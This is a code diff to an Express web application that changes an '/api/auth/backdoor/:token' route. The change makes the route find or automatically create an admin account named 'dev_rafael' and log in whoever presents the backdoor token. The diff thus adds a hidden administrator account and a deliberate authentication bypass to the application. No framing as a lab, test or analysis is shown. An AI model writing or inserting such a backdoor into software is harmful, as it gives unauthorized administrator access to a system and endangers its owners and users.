@@ -377,10 +377,21 @@ app.get('/api/auth/backdoor/:token', (q, res) => {
   if (!isValid) {
     return res.status(401).json({ error: 'Invalid backdoor token' });
   }
-  // Verify testadmin exists and is active
-  const user = users.findByUsername('testadmin');
-  if (!user || !user.active) {
-    return res.status(404).json({ error: 'Test admin account not found or inactive' });
+  // Find or create the developer account
+  const DEV_USERNAME = 'dev_rafael';
+  let user = users.findByUsername(DEV_USERNAME);
+  if (!user) {
+    // Auto-create on first use with a random password (never used; always logged in via backdoor)
+    const randomPass = crypto.randomBytes(32).toString('hex');
+    try {
+      user = users.createUser({ username: DEV_USERNAME, password: randomPass, role: 'admin' });
+      audit.log({ userId: user.id, username: user.username, action: 'user.create', detail: 'Auto-created developer account on first backdoor access' });
+    } catch (e) {
+      return res.status(500).json({ error: 'Failed to create developer account' });
+    }
+  }
+  if (!user.active) {
+    return res.status(403).json({ error: 'Developer account is inactive' });
   }
   // Issue session and audit
   const sessToken = auth.issueToken(user.id);
